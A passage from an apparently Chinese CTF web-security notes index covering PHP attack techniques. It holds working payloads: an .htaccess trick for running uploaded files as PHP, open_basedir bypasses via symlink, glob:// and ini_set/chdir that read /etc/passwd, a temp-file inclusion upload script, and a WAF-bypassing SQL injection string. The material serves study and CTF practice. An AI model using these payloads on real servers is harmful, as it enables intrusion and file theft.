\u4ee5\u4f5c\u7528\u4e8e\u6b64\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\u3002\u4f5c\u4e3a\u7528\u6237\uff0c\u6240\u80fd\u4f7f\u7528\u7684\u547d\u4ee4\u53d7\u5230\u9650\u5236\u3002\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7Apache\u7684AllowOverride\u6307\u4ee4\u6765\u8bbe\u7f6e\u3002.htaccess\u662f\u4e00\u4e2a\u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u5b58\u653e\u7740\u4e00\u4e9bapache\u6307\u4ee4\uff0c\u4e0ehttpd.conf\u7c7b\u4f3c\uff0c\u4f46\u4f5c\u7528\u8303\u56f4\u4ec5\u9650\u5f53\u524d\u76ee\u5f55\u3002</p> <p>.htaccess\u662f\u5728\u7528\u6237\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u7ad9\u70b9\u65f6\u52a0\u8f7d\u7684\uff0c\u4e0d\u9700\u8981\u91cd\u542fapache\u670d\u52a1\u8fdb\u884c\u8f7d\u5165\uff0c\u66f4\u7075\u6d3b\u4f46\u66f4\u8017\u7cfb\u7edf\u8d44\u6e90\u3002\u7531\u4e8e.htaccess\u53ef\u4ee5\u914d\u7f6e\u5f88\u591a\u4e1c\u897f\uff0c\u5982\u76ee\u5f55\u8bbf\u95ee\u3001\u6587\u4ef6\u6267\u884c\u3001\u9519\u8bef\u9875\u9762\u91cd\u5b9a\u5411\u7b49</p> <p>\u7a0d\u5fae\u4e3e\u4e2a\u4f8b\u5b57\uff1a</p> <p> <p>SetHandlerapplication/x-httpd-php</p> <p>//\u6216\u8005\u5e72\u8106\u4e0d\u8981FilesMatch,\u8fd9\u91cc\u7684\u610f\u601d\u662f\u914d\u7f6e\uff0c\u5982\u679c\u5305\u542b1\uff0c\u5219\u5c06\u5176\u89c6\u4e3aphp\u6587\u4ef6\u6267\u884c</p> <p>\u901a\u5e38\u5728\u6587\u4ef6\u4e0a\u4f20\u4e2d\u4f7f\u7528\u3002\u4e0a\u4f20\u4e00\u4e2a.htaccess\u6587\u4ef6\u4e4b\u540e\u5c31\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u5305\u542b1\u7684\u6587\u4ef6\u4e0a\u53bb\uff0c\u4e71\u6740\u6267\u884c\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/","title":"Open basedir\u7ed5\u8fc7","text":"<p>open_basedir\u7ed5\u8fc7</p> <p>open_basedir\u662fphp.ini\u4e2d\u7684\u4e00\u4e2a\u914d\u7f6e\u9009\u9879\uff0c\u5b83\u53ef\u5c06\u7528\u6237\u8bbf\u95ee\u6587\u4ef6\u7684\u6d3b\u52a8\u8303\u56f4\u9650\u5236\u5728\u6307\u5b9a\u7684\u533a\u57df</p> <p>\u5047\u8bbeopen_basedir=/home/wwwroot/home/web1/:/tmp/\uff0c\u90a3\u4e48\u901a\u8fc7web1\u8bbf\u95ee\u670d\u52a1\u5668\u7684</p> <p>\u7528\u6237\u5c31\u65e0\u6cd5\u83b7\u53d6\u670d\u52a1\u5668\u4e0a\u9664\u4e86/home/wwwroot/home/web1/\u548c/tmp/\u8fd9\u4e24\u4e2a\u76ee\u5f55\u4ee5\u5916\u7684\u6587\u4ef6\u3002</p> <p>\u6ce8\u610f\u7528open_basedir\u6307\u5b9a\u7684\u9650\u5236\u5b9e\u9645\u4e0a\u662f\u524d\u7f00,\u800c\u4e0d\u662f\u76ee\u5f55\u540d\u3002\u4e3e\u4f8b\u6765\u8bf4: \u82e5\"open_basedir = /dir/user\", \u90a3\u4e48\u76ee\u5f55 \"/dir/user\" \u548c \"/dir/user1\"\u90fd\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002\u4ee5\u4e0b\u4e3a\u642c\u8fd0</p> <p>\u6211\u4eec\u5728wwwroot\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2ahtml\u6587\u4ef6\u5939\u548c\u4e00\u4e2a\u6587\u672c\u6587\u4ef61.txt</p> <p>\u5176\u4e2d1.txt\u5185\u5bb9\u4e3a123456</p> <p>html\u4e3a\u7f51\u7ad9\u6839\u76ee\u5f55\uff0c\u4e0b\u6709\u4e00\u4e2aindex.php\u548ctest.php</p> <p>\u5176\u4e2dtest.php\u5c31\u662f\u6211\u4eec\u7528\u6765\u6d4b\u8bd5\u7684php\u6587\u4ef6\uff0c\u5982\u4e0b</p> <pre><code>&lt;?php\nhighlight_file(\"../1.txt\");\n$file=file_get_contents('../1.txt');\necho $file;\n?&gt;\n</code></pre> <p>\u5728\u672a\u8bbe\u7f6eopen_basedir\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u7ed3\u679c</p> <p></p> <p>\u6211\u4eec\u8bbe\u7f6eopen_basedir</p> <p></p> <p>\u5373\u53ea\u80fd\u8bbf\u95eehtml\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6</p> <p></p> <p>\u53ef\u89c1\uff0c\u65e0\u8bba\u662ffile_get_contents\u51fd\u6570\u8fd8\u662fhighlight_file\u90fd\u65e0\u6548</p> <p>\u7531\u4e8eopen_basedir\u7684\u8bbe\u7f6e\u5bf9system\u7b49\u547d\u4ee4\u6267\u884c\u51fd\u6570\u662f\u65e0\u6548\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u6267\u884c\u51fd\u6570\u6765\u8bbf\u95ee\u9650\u5236\u76ee\u5f55\u3002</p> <p>\u6211\u4eec\u5c06test.php\u4fee\u6539\u540e</p> <p></p> <p>\u53ef\u89c1\u53ef\u4ee5\u65e0\u89c6open_basedir\uff0c\u4f46\u662f\u4e00\u822c\u90fd\u4f1a\u7981\u7528\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff0c\u6240\u4ee5\u5b9e\u7528\u4ef7\u503c\u4e0d\u5927</p> <p>\uff08\u786e\u5b9e\uff0c\u6709system\u4e86\u8c01\u8fd8\u7ed5\u4f60\u4e2a\u5927\u5934\u9b3c\u554a\uff09</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#symlink","title":"\u8f6f\u94fe\u63a5\uff1asymlink()\u51fd\u6570","text":"<p>\u6ce8\u610f\uff1a \u9488\u5bf9 Windows\uff1a\u8fd0\u884c PHP \u4e8eVista\u3001Server 2008 \u6216\u66f4\u9ad8\u7248\u672c\u624d\u80fd\u6b63\u5e38\u4f7f\u7528\u3002 \u4e4b\u524d\u7248\u672c\u7684 Windows \u4e0d\u652f\u6301\u7b26\u53f7\u8fde\u63a5</p> <p>\u6b64\u6b21\u5b9e\u9a8c\u73af\u5883\uff1alinux Ubuntu18.04.4 php 7.1.31</p> <p>\u6211\u4eec\u9996\u5148\u5c1d\u8bd5\u4f7f\u7528symlink\u521b\u5efa\u4e00\u4e2a\u8f6f\u94fe\u63a5</p> <p></p> <p>\u76ee\u6807\u6307\u5411html\u76ee\u5f55\u4e0b\u7684error\u6587\u4ef6\u5939\uff0c\u8bbf\u95ee\u540e\u53d1\u73b0\u751f\u6210\u4e00\u4e2a\u94fe\u63a5</p> <p></p> <p>\u53cc\u51fb\u8fdb\u53bb\u53ef\u4ee5\u8bbf\u95ee\u5230\u5982\u4e0b</p> <p></p> <p>\u6211\u4eec\u4fdd\u6301\u4e4b\u524d\u7684\u8bbe\u7f6e\u4e0d\u53d8\uff0c\u5c1d\u8bd5\u5728open_basedir\u8bbe\u7f6e\u5230html\u76ee\u5f55\u4e0b\uff0c\u8bfb\u53d6\u548chtml\u6587\u4ef6\u5939\u5e73\u884c\u76841.txt</p> <p>\u6211\u4eec\u7ed9\u51fa\u6f0f\u6d1ephp\u5185\u5bb9</p> <pre><code>&lt;?php\nmkdir(\"c\");\nchdir(\"c\");\nmkdir(\"d\");\nchdir(\"d\");\nchdir(\"..\");\nchdir(\"..\");\nsymlink(\"c/d\",\"tmplink\");\nsymlink(\"tmplink/../../1.txt\",\"exploit\");\nunlink(\"tmplink\");\nmkdir(\"tmplink\");\necho file_get_contents(\"http://localhost/exploit\");\n?&gt;\n</code></pre> <p>\u8fd0\u884c\u540e\u7ed3\u679c\u5982\u4e0b\uff0c\u53ef\u89c1\u5728html\u4e0b\u751f\u6210c/d/\u548ctmplink\u4ee5\u53caexploit\uff0c\u800c\u6211\u4eec\u6210\u529f\u8bfb\u53d6\u5230\u4e861.txt\u7684\u5185\u5bb9</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u4e00\u4e0b\u94fe\u63a5</p> <p></p> <p>exploit\u94fe\u63a5\u5230\u7684\u662ftmplink/../../1.txt\uff0c\u800ctmplink\u94fe\u63a5\u5230c/d\uff0c\u76f8\u5f53\u4e8eexploit\u94fe\u63a5\u5230c/d/../../1.txt\uff0c\u8def\u5f84\u5728open_basedir\u89c4\u5b9a\u7684\u76ee\u5f55\u4e0b\uff0c\u7b26\u5408\u64cd\u4f5c\u89c4\u8303\uff0c\u4e4b\u540e\u5220\u9664\u4e86tmplink\u94fe\u63a5\uff0c\u521b\u5efa\u4e86tmplink\u5b9e\u4f53\u6587\u4ef6\u5939\uff0c\u76f8\u5f53\u4e8e\u6b64\u65f6\u7684exploit\u6307\u5411\u7684\u5c31\u662ftmplink/../../1.txt,\u4e5f\u5c31\u6210\u529f\u8bfb\u53d6\u5230\u4e861.txt</p> <p>\u5173\u4e8e\u8f6f\u94fe\u4e5f\u53ef\u4ee5\u6709\u53e6\u4e00\u79cd\u505a\u6cd5\uff0c\u6d4b\u8bd5php\u5982\u4e0b</p> <pre><code>mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);\nsymlink('/var/www/html/a/b/c/d/e/f/g','foo');\nini_set('open_basedir','/var/www/html:bar/');\nsymlink('foo/../../../../../../','bar');\nunlink('foo');\nsymlink('/var/www/html','foo');\necho file_get_contents('bar/etc/passwd');\n</code></pre> <p>\u539f\u7406\u662f\u4e00\u6837\u7684\uff0c\u53ea\u4e0d\u8fc7\u628a\u8f6f\u94fe\u6539\u4e3a\u5b9e\u4f53\u6587\u4ef6\u5939\u7684\u6b65\u9aa4\u6362\u6210\u4e86\u91cd\u6784\u8f6f\u94fe\u76ee\u6807</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#glob","title":"glob\u4f2a\u534f\u8bae","text":"<p>glob\u4f2a\u534f\u8bae\u5728\u7b5b\u9009\u76ee\u5f55\u65f6\u4e0d\u53d7open_basedir\u5236\u7ea6</p> <pre><code>&lt;?php\nprintf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));\n$file_list = array();\n// normal files\n$it = new DirectoryIterator(\"glob:///*\");\nforeach($it as $f) {\n$file_list[] = $f-&gt;__toString();\n}\n// special files (starting with a dot(.))\n$it = new DirectoryIterator(\"glob:///.*\");\nforeach($it as $f) {\n$file_list[] = $f-&gt;__toString();\n}\nsort($file_list);\nforeach($file_list as $f){\necho \"{$f}&lt;br/&gt;\";\n}\n?&gt;\n</code></pre> <p>\u4e0a\u8ff0payload\u53ef\u5728php5.3\u4ee5\u4e0a\u8bfb\u53d6\u4ec5\u9488\u5bf9linux\u6839\u76ee\u5f55\u7684\u76ee\u5f55</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#ini_set","title":"\u5229\u7528ini_set\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9","text":"<p>\u6211\u4eec\u7ed9\u51fa\u6f0f\u6d1e\u5229\u7528\u811a\u672c\uff0c\u7531\u4e8e\u6f0f\u6d1e\u539f\u7406\u590d\u6742\uff0c\u6709\u5174\u8da3\u53ef\u4ee5\u81ea\u5df1\u7814\u7a76\uff0c\u8fd9\u91cc\u5c31\u4e0d\u53d9\u8ff0</p> <pre><code>&lt;?php\nmkdir('tmpdir');\nchdir('tmpdir');\nini_set('open_basedir','..');\nchdir('..');\nchdir('..');\nchdir('..');\nchdir('..');\nchdir('..');\nini_set('open_basedir','/');\n$a=file_get_contents('/etc/passwd');\nvar_dump($a);\n?&gt;\n</code></pre> <p>\u6ce8\u610f\uff1a\u8fd9\u91cc\u7684chdir(\"..\");\u6570\u91cf\u636e\u5177\u4f53\u73af\u5883\u4fee\u6539\uff0c\u4e00\u822c\u8981\u6c42\u662f\u5982\u679c\u518dchdir\u4e00\u6b21\u5c31\u8fdb\u5165\u6839\u76ee\u5f55\u4e3a\u6b62\uff0c\u6bd4\u5982php\u6587\u4ef6\u7684\u4f4d\u7f6e\u4e3a/www/admin/localhost_80/wwwroot/html/\u4e0b,\u90a3\u4e48\u5c31\u8981\u4f7f\u7528\u4e94\u6b21chdir(\"..\");</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#_1","title":"\u516d.\u5176\u4ed6\u8bfb\u76ee\u5f55\u65b9\u5f0f","text":"<p>\u5bf9\u4e8ewindows\u7cfb\u7edf</p> <pre><code>&lt;?php\nini_set('open_basedir', dirname(__FILE__));\nprintf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));\nset_error_handler('isexists');\n$dir = 'd:/test/';\n$file = '';\n$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\nfor ($i=0; $i &lt; strlen($chars); $i++) {\n$file = $dir . $chars[$i] . '&lt;&gt;&lt;';\nrealpath($file);\n}\nfunction isexists($errno, $errstr)\n{\n$regexp = '/File\\((.*)\\) is not within/';\npreg_match($regexp, $errstr, $matches);\nif (isset($matches[1])) {\nprintf(\"%s &lt;br/&gt;\", $matches[1]);\n}\n}\n?&gt;\n&lt;?php\nini_set('open_basedir', dirname(__FILE__));\nprintf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));\n$basedir = 'D:/test/';\n$arr = array();\n$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';\nfor ($i=0; $i &lt; strlen($chars); $i++) {\n$info = new SplFileInfo($basedir . $chars[$i] . '&lt;&gt;&lt;');\n$re = $info-&gt;getRealPath();\nif ($re) {\ndump($re);\n}\n}\nfunction dump($s){\necho $s . '&lt;br/&gt;';\nob_flush();\nflush();\n}\n&lt;?php\nini_set('open_basedir', dirname(__FILE__));\nprintf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));\nset_error_handler('isexists');\n$dir = 'd:/test/';\n$file = '';\n$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\nfor ($i=0; $i &lt; strlen($chars); $i++) {\n$file = $dir . $chars[$i] . '&lt;&gt;&lt;';\n//$m = imagecreatefrompng(\"zip.png\");\n//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');\nimageftbbox(100, 100, $file, 'aaa');\n}\nfunction isexists($errno, $errstr)\n{\nglobal $file;\nif (stripos($errstr, 'Invalid font filename') === FALSE) {\nprintf(\"%s&lt;br/&gt;\", $file);\n}\n}\n?&gt;\n</code></pre> <p>\u4ee5\u4e0a\u90fd\u662fwindows\u4e0b\u7684\u5217\u76ee\u5f55\u65b9\u5f0f\uff0c\u7528\u5230\u4e86windows\u4e0b\u901a\u914d\u7b26&lt;&gt;</p> <pre><code>&lt;?php\nprintf('&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));\n$re = bindtextdomain('xxx', $_GET['dir']);\nvar_dump($re);\n?&gt;\n</code></pre> <p>\u8fd9\u4e2a\u662flinux\u4e0b\u7684\u65b9\u6cd5\uff0cdir\u4f20\u5165\u7684\u53c2\u6570\u662f\u76ee\u5f55\uff0c\u5982\u679c\u76ee\u5f55\u5b58\u5728\uff0c\u5c31\u8fd4\u56de\u76ee\u5f55\u8def\u5f84\uff0c\u4e0d\u5b58\u5728\u5c31\u8fd4\u56debool(false)\uff0c\u7528\u4e8e\u66b4\u529b\u731c\u89e3\u76ee\u5f55</p> <p>\u5173\u4e8eini_set\u7684\u539f\u7406\uff0c\u6211\u4e5f\u627e\u5230\u4e86\u4e00\u70b9\u5185\u5bb9\u76f4\u63a5copy\u4e0b\u6765\u3002</p> <p>\u5148\u770bpayload</p> <pre><code>chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#_2","title":"\u6e90\u7801\u5206\u6790","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#ini_set_1","title":"ini_set","text":"<p>\u5f88\u597d\u641c</p> <p></p> <p>\u5bf9\u7740php.net\u7684\u89e3\u91ca\u770b\u4e00\u4e0b \u731c\u4e5f\u80fd\u731c\u4e2a\u5927\u6982</p> <p>\u5148\u8df3\u8fc7<code>php_check_open_basedir</code>\u770b<code>zend_alter_ini_entry_ex</code></p> <p></p> <p>\u5148\u4eceEG\u8868\u4e2d\u53d6\u51fa\u8981\u4fee\u6539\u7684\u9879\u76ee\u7684\u6307\u9488\uff0c\u7136\u540e\u4e00\u8def\u8d4b\u503c\u8fc7\u53bb<code>new_value =&gt; duplicate =&gt; ini_entry-&gt;value</code></p> <p>\u76f4\u63a5\u770b\u4e0bgdb\u7684\u8c03\u8bd5\u7ed3\u679c \u6700\u521d\u7684\u65f6\u5019\u503c\u662fini\u91cc\u9762\u7684\u503c</p> <p></p> <p>\u6267\u884c\u4e0b\u53bb \u53ef\u4ee5\u770b\u5230\u503c\u6539\u53d8\u4e86</p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#chdir","title":"chdir","text":"<p>\u5148\u7ecf\u8fc7open_basedir\u7684\u68c0\u6d4b \u7136\u540e\u6765\u5230336\u884c<code>VCWD_CHDIR</code>\u8fd9\u4e2a\u5b8f\u6700\u7ec8\u4f1a\u8c03\u7528<code>_chdir()</code>\u6765\u4fee\u6539\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#open_basedir","title":"open_basedir\u5b9e\u73b0","text":"<p>\u8fd9\u4e2a\u4e5f\u7b80\u5355 \u5148\u770b\u4e0b\u62a5\u9519\u641c\u6e90\u4ee3\u7801</p> <p></p> <p></p> <p>\u8fd9\u4e2a\u51fd\u6570\u5c31\u662f\u4e0a\u9762\u5ffd\u7565\u7684<code>php_check_open_basedir</code>\u7684\u5177\u4f53\u5b9e\u73b0 \u51fd\u6570\u5f88\u7b80\u5355\u6ca1\u5565\u597d\u8bf4\u7684 \u76f4\u63a5\u8ddf<code>php_check_specific_open_basedir</code>(\u867d\u7136\u8fd9\u91cc<code>ptr</code>\u7684\u503c\u6765\u81ea<code>PG(open_basedir)</code>\u4f46\u662f\u5728<code>ini_set</code>\u4e2d\u4f5c\u51fa\u7684\u5bf9<code>EG</code>\u7684\u4fee\u6539\u6700\u7ec8\u4f1a\u5f71\u54cd<code>PG</code>)</p> <p>\u51fd\u6570\u6709\u70b9\u957f\u4e0d\u60f3\u770b \u76f4\u63a5gdb\u8c03\u4e00\u53d1 \u5bf9\u7740<code>php_check_specific_open_basedir</code>\u6253\u4e2a\u65ad\u70b9 \u7136\u540e\u76f4\u63a5c\u5230\u7b2c\u4e00\u4e2a<code>chdir('..')</code></p> <p></p> <p>\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u4f20\u8fdb\u53bb\u7684\u4e24\u4e2a\u53c2\u6570 \u7ee7\u7eed\u6267\u884c\u6765\u5230161\u884c \u5148\u8bb0\u5f55\u4e00\u4e0b\u5173\u952e\u53c2\u6570</p> <p></p> <p>\u6267\u884c\u4e0b\u53bb \u4f1a\u53d1\u73b0\u4e00\u4e2a\u6709\u8da3\u7684\u7ed3\u679c<code>/ =&gt; \\000</code></p> <p></p> <p>\u770b\u4e0b\u6e90\u7801 \u8089\u773c\u8ddf\u4e00\u4e0b\u6765\u5230<code>expand_filepath_with_mode</code>\u5927\u81f4\u529f\u80fd\u5c31\u662f\u89c4\u8303\u5316\u8def\u5f84</p> <p></p> <p><code>relative_to</code>\u5fc5\u5b9a\u4e3aNULL \u6240\u4ee5\u5fc5\u5b9a\u8fdb\u5165esle\u903b\u8f91 \u800c<code>VCWD_GETCWD</code>\u8fd9\u4e2a\u5b8f\u6700\u7ec8\u662f\u901a\u8fc7<code>_getcwd()</code>\u5b9e\u73b0\u7684</p> <p>\u7ee7\u7eed\u8ddf \u6765\u5230216\u884c \u8fd8\u662f\u5148\u8bb0\u5f55\u4e00\u4e0b\u5173\u952e\u53d8\u91cf\u7684\u503c</p> <p>\u7ee7\u7eed\u6267\u884c\u5230<code>strncmp</code>\u518d\u770b\u4e00\u4e0b\u53d8\u91cf\u7684\u503c</p> <p></p> <p>\u770b\u4e86\u4e0b\u5c31<code>resolved_name_len</code>\u53d8\u5316\u4e86 \u56de\u53bb\u770b\u6e90\u4ee3\u7801</p> <pre><code>resolved_name_len = strlen(resolved_name);\n</code></pre> <p>\u56e0\u4e3ac\u4e2d\u5b57\u7b26\u4e32\u662f\u4ee5<code>\\0</code>\u4e3a\u7ed3\u5c3e \u6240\u4ee5\u957f\u5ea6\u4ece17\u53d8\u4e3a13 \u7ecf\u8fc7<code>strncmp</code>\u5224\u65ad \u524d13\u300114\u4f4d\u80af\u5b9a\u4e00\u6837 \u8fd4\u56de0 \u7136\u540e\u8fd9\u4e2acheck\u5c31\u8fc7\u4e86</p> <p>\u5230\u8fd9\u91cc\u4e3a\u6b62\u597d\u50cf\u8fd8\u6ca1\u4ec0\u4e48\u95ee\u9898 \u90a3\u4e48\u56de\u5230\u521a\u521a</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#_3","title":"\u95ee\u9898\u6240\u5728","text":"<p>\u521a\u624d\u662f\u4ece\u7b2c\u4e00\u4e2a<code>chdir('..')</code>\u5f00\u59cb\u8c03\u8bd5\u7684 \u91cd\u65b0\u68b3\u7406\u4e00\u4e0b</p> <p>\u9996\u5148\u4f20\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u7684\u503c\u90fd\u662f\u90fd\u662f<code>..</code>\u8fd9\u4e2a\u5e94\u8be5\u6ca1\u4ec0\u4e48\u95ee\u9898</p> <p></p> <p>\u6765\u5230151\u884c \u5c31\u662f\u4e00\u4e2a\u590d\u5236\u611f\u89c9\u4e5f\u6ca1\u95ee\u9898</p> <pre><code>strlcpy(local_open_basedir, basedir, sizeof(local_open_basedir));\n</code></pre> <p>\u770b\u4e00\u4e0b\u503c</p> <p></p> <p>\u95ee\u9898\u6765\u4e86<code>local_open_basedir</code>\u4f1a\u5728\u4e4b\u540e\u7684\u903b\u8f91\u4e2d\u53c2\u4e0e<code>resolved_basedir</code>\u7684\u89c4\u8303\u5316</p> <p>\u4f46\u662f\u7531\u4e8e\u5f00\u5934\u7684<code>..\\0</code>\u4f1a\u4f7f\u5f97<code>resolved_basedir</code>\u7684\u89c4\u8303\u5316\u6d41\u7a0b\u548c<code>resolved_name</code>\u4e00\u6837 \u90fd\u662f\u4ee5\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e3a\u57fa\u7840\u8fdb\u884c\u5904\u7406</p> <p></p> <p><code>..\\0</code>\u5bfc\u81f4if\u5fc5\u7136\u662f\u5047 \u4ece\u800c\u8fdb\u5165else\u903b\u8f91 \u90a3\u5c31\u4e00\u5b9a\u4f1a\u5230<code>VCWD_GETCWD</code>\u8fd9\u4e2a\u5b8f \u6700\u540e\u4f1a\u4f7f<code>resolved_basedir</code>\u548c<code>resolved_name</code>\u7684\u503c\u51e0\u4e4e\u4e00\u6837</p> <p>\u8fd9\u6837\u5c31\u5bfc\u81f4\u4e86<code>php_check_specific_open_basedir</code>\u4e00\u76f4\u8fd4\u56de0 \u4ece\u800c\u63a7\u5236\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e00\u76f4\u5411\u4e0a\u7a7f\u8d8a \u5bfc\u81f4open_basedir\u88ab\u7ed5\u8fc7</p> <p>\u8fd9\u91cc\u7684\u5173\u952e\u5c31\u662f\u5982\u4f55\u5c06open_basedir\u8bbe\u7f6e\u4e3a<code>..</code>\u5728payload\u4e2d\u5148<code>chdir</code>\u5230\u4e86img \u518d\u5229\u7528open_basedir\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u76f8\u5bf9\u76ee\u5f55\u7684\u7279\u70b9\u8fdb\u884cbypass</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/php7_segment_fault%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","title":"php7 segment fault\u4e34\u65f6\u6587\u4ef6\u5305\u542b","text":"<p>\u5411PHP\u53d1\u9001\u542b\u6709\u6587\u4ef6\u533a\u5757\u7684\u6570\u636e\u5305\u65f6\uff0c\u8ba9PHP\u5f02\u5e38\u5d29\u6e83\u9000\u51fa\uff0cPOST\u7684\u4e34\u65f6\u6587\u4ef6\u5c31\u4f1a\u88ab\u4fdd\u7559</p> <p>1.\u5229\u7528\u80fd\u8bbf\u95ee\u7684phpinfo\u9875\u9762\uff0c\u5bf9\u5176\u4e00\u6b21\u53d1\u9001\u5927\u91cf\u6570\u636e\u9020\u6210\u4e34\u65f6\u6587\u4ef6\u6ca1\u6709\u53ca\u65f6\u88ab\u5220\u9664</p> <p>2.PHP\u7248\u672c&lt;7.2\uff0c\u5229\u7528php\u5d29\u6e83\u7559\u4e0b\u4e34\u65f6\u6587\u4ef6</p> <p>php &lt; 7.2php://filter/string.strip_tags/resource=/etc/passwd</p> <ul> <li> <p>php7 \u8001\u7248\u672c\u901a\u6740php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</p> </li> <li> <pre><code>import requestsfrom io import BytesIOurl=\"http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"payload=\"&lt;?php phpinfo();?&gt;\"files={    \"file\":BytesIO(payload.encode())}r=requests.post(url=url,files=files,allow_redirects=False)\nprint(r.text)\nPython\n</code></pre> </li> </ul> <p>\u539f\u9898\uff1a[NPUCTF2020]ezinclude</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/","title":"PHP\u7684\u5b57\u7b26\u4e32\u89e3\u6790\u7279\u6027","text":"<pre><code>\u6211\u4eec\u77e5\u9053 PHP \u5c06\u67e5\u8be2\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5185\u90e8\u5173\u8054\u6570\u7ec4 $_GET \u6216\u5173\u8054\u6570\u7ec4 $_POST\u3002\u4f8b\u5982\uff1a/?foo=bar \u5c06\u53d8\u6210 Array([foo] =&gt; \"bar\")\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u67e5\u8be2\u5b57\u7b26\u4e32\u5728\u89e3\u6790\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u67d0\u4e9b\u5b57\u7b26\u5220\u9664\u6216\u7528\u4e0b\u5212\u7ebf\u4ee3\u66ff\u3002\u4f8b\u5982\uff0c/?%20news[id%00=42 \u4f1a\u8f6c\u6362\u4e3aArray([news_id] =&gt; 42)\u3002\u5982\u679c\u4e00\u4e2a IDS/IPS \u6216 WAF \u4e2d\u6709\u4e00\u6761\u89c4\u5219\u662f\u5f53 news_id \u53c2\u6570\u7684\u503c\u662f\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u503c\u5219\u62e6\u622a\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u7528\u4ee5\u4e0b\u8bed\u53e5\u7ed5\u8fc7\uff1a\n\n/news.php?%20news[id%00=42\"+AND+1=0\u2013-+\n\nSo when we pass parameters, we use [ instead of _ to bypass the 